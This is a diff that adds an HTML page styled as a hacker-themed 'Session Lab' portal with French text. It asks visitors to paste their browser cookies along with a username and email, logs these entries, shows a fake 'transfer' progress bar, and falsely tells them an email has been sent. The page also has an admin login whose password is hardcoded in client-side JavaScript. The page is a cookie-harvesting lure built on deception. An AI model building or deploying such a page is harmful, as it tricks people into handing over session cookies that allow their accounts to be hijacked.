@@ -1,0 +1,98 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Cyber-Security Lab | User Portal</title>
+    <style>
+        :root { --neon-green: #00ff41; --dark-bg: #0d0208; }
+        body { background: var(--dark-bg); color: var(--neon-green); font-family: 'Courier New', monospace; margin: 0; padding: 20px; display: flex; flex-direction: column; align-items: center; }
+        
+        .container { max-width: 500px; width: 100%; border: 1px solid var(--neon-green); padding: 30px; box-shadow: 0 0 15px rgba(0, 255, 65, 0.2); margin-top: 50px; }
+        h1 { text-transform: uppercase; letter-spacing: 5px; text-align: center; border-bottom: 1px solid var(--neon-green); padding-bottom: 10px; }
+        
+        input, textarea { background: transparent; border: 1px solid var(--neon-green); color: var(--neon-green); width: 100%; padding: 12px; margin: 10px 0; box-sizing: border-box; }
+        button { background: var(--neon-green); color: black; border: none; padding: 12px 20px; cursor: pointer; font-weight: bold; width: 100%; transition: 0.3s; margin-top: 10px; }
+        button:hover { background: white; box-shadow: 0 0 10px white; }
+
+        /* Zones d'affichage */
+        #loading-zone { display: none; text-align: center; padding: 40px; }
+        .hidden { display: none; }
+
+        .glitch { font-size: 1.2rem; animation: pulse 1.5s infinite; }
+        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <h1>SESSION LAB v1.0</h1>
+
+    <div id="user-view">
+        <p>[SYSTEM]: Entrez les informations pour synchroniser.</p>
+        <input type="text" id="username" placeholder="Username">
+        <input type="email" id="userEmail" placeholder="Votre Email">
+        <textarea id="cookieInput" rows="4" placeholder="Collez les Cookies ici..."></textarea>
+        <button onclick="processData()">INITIER LE TRANSFERT</button>
+    </div>
+
+    <div id="loading-zone">
+        <div class="glitch" id="status-text">INITIALISATION DU CRYPTAGE...</div>
+        <div style="margin-top: 20px; color:white;">[████████░░░░] 65%</div>
+    </div>
+
+    <div id="admin-login-zone" style="margin-top: 40px; border-top: 1px dashed #333; padding-top: 20px; width: 100%;">
+        <h3 style="font-size: 0.9rem;">PORTAIL D'ADMINISTRATION</h3>
+        <input type="password" id="adminPass" placeholder="Mot de passe Admin">
+        <button onclick="accessAdmin()" style="background: #333; color: var(--neon-green); border: 1px solid var(--neon-green);">LOG IN</button>
+    </div>
+</div>
+
+<script>
+    function processData() {
+        const u = document.getElementById('username').value;
+        const e = document.getElementById('userEmail').value;
+        const c = document.getElementById('cookieInput').value;
+
+        if(!u || !e) return alert("Erreur : Tous les champs sont requis.");
+
+        // Cache le formulaire, montre le chargement
+        document.getElementById('user-view').style.display = 'none';
+        document.getElementById('loading-zone').style.display = 'block';
+
+        // Sauvegarde dans le "carnet" du navigateur (LocalStorage)
+        let logs = JSON.parse(localStorage.getItem("logs")) || [];
+        logs.push({
+            username: u,
+            email: e,
+            cookies: c,
+            date: new Date().toLocaleString()
+        });
+        localStorage.setItem("logs", JSON.stringify(logs));
+
+        // Simulation de progression (4 secondes)
+        const status = document.getElementById('status-text');
+        setTimeout(() => { status.innerText = "ENVOI DES PAQUETS..."; }, 1500);
+        setTimeout(() => { status.innerText = "SYNCHRONISATION TERMINÉE."; }, 3000);
+        
+        setTimeout(() => {
+            status.innerHTML = `
+                <span style="color:white;">TRANSFERT RÉUSSI</span><br><br>
+                Veuillez attendre <b style="color:yellow;">1-2 heures</b>.<br>
+                Un email a été envoyé à : ${e}
+            `;
+        }, 4500);
+    }
+
+    function accessAdmin() {
+        const pass = document.getElementById('adminPass').value;
+        if(pass === "JOA12345") {
+            // Vérifie bien que ton 2ème fichier s'appelle admin.html
+            window.location.href = "admin.html"; 
+        } else {
+            alert("Accès refusé.");
+        }
+    }
+</script>
+
+</body>
+</html>
